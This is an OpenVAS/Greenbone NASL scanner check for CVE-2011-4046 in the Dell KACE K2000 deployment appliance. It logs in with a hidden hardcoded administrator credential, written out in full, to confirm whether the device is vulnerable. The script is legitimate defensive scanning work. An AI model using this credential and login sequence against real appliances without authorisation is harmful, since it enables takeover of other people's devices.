# Copyright (C) 2011 Greenbone Networks GmbH
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-or-later
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.

CPE = "cpe:/h:dell:kace_k2000_systems_deployment_appliance";

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103318");
  script_version("2023-03-08T10:19:59+0000");
  script_tag(name:"last_modification", value:"2023-03-08 10:19:59 +0000 (Wed, 08 Mar 2023)");
  script_tag(name:"creation_date", value:"2011-11-11 11:42:28 +0100 (Fri, 11 Nov 2011)");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");

  script_cve_id("CVE-2011-4046");

  script_tag(name:"qod_type", value:"remote_vul");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("Quest / Dell KACE K2000 Systems Deployment Appliance (SDA) < 3.7 Hardcoded Credentials (HTTP)");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2011 Greenbone Networks GmbH");
  script_family("Default Accounts");
  script_dependencies("gb_quest_kace_sda_http_detect.nasl", "gb_default_credentials_options.nasl");
  script_mandatory_keys("quest/kace/sda/http/detected");
  script_require_ports("Services/www", 443);
  script_exclude_keys("default_credentials/disable_default_account_checks");

  script_tag(name:"summary", value:"The Quest / Dell KACE K2000 System Deployment Appliance (SDA)
  contains a hidden administrator account that allows a remote attacker to take control of an
  affected device.");

  script_tag(name:"vuldetect", value:"Tries to log in with a hidden account.");

  script_tag(name:"solution", value:"Update to version 3.7 or later.");

  script_xref(name:"URL", value:"http://www.kb.cert.org/vuls/id/135606");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/50605");
  script_xref(name:"URL", value:"http://www.kace.com/support/kb/index.php?action=artikel&id=1120&artlang=en");

  exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");

if(get_kb_item("default_credentials/disable_default_account_checks"))
  exit(0);

if (!port = get_app_port(cpe: CPE, service: "www"))
  exit(0);

if (!get_app_location(cpe: CPE, port: port, nofork:TRUE))
  exit(0);

req = http_get(item: "/", port:port);
buf = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);

session_id = eregmatch(pattern:"Set-Cookie: (kboxid=[^;]+)",string:buf);
if (isnull(session_id[1]))
  exit(0);

sess = session_id[1];

up = "kbox1248163264128256";
url = "/_login";
host = http_host_name(port: port);

ex = string("LOGIN_NAME=",up,"&LOGIN_PASSWORD=",up,"&save=Login");

req = string("POST ", url, " HTTP/1.1\r\n",
             "Host: ", host,"\r\n",
             "Content-Type: application/x-www-form-urlencoded;\r\n",
             "Connection: Close\r\n",
             "Cookie: ",sess,"\r\n",
             "Content-Length: ",strlen(ex),"\r\n",
             "\r\n",
             ex);
res = http_send_recv(port:port, data:req);

if(res =~ "^HTTP/1\.[01] 30") {
  loc = "/tasks";
  req = string("GET ", loc , " HTTP/1.1\r\n",
               "Host: ", host,"\r\n",
               "Cookie: ",sess,"\r\n",
               "Connection: Keep-Alive\r\n\r\n");
  res = http_send_recv(port:port, data:req);

  if("Logged in as: kbox" >< res && "Log Out" >< res) {
    report = "It was possible to log in with the hidden administrator account.";
    security_message(port: port, data: report);
    exit(0);
  }
}

exit(99);
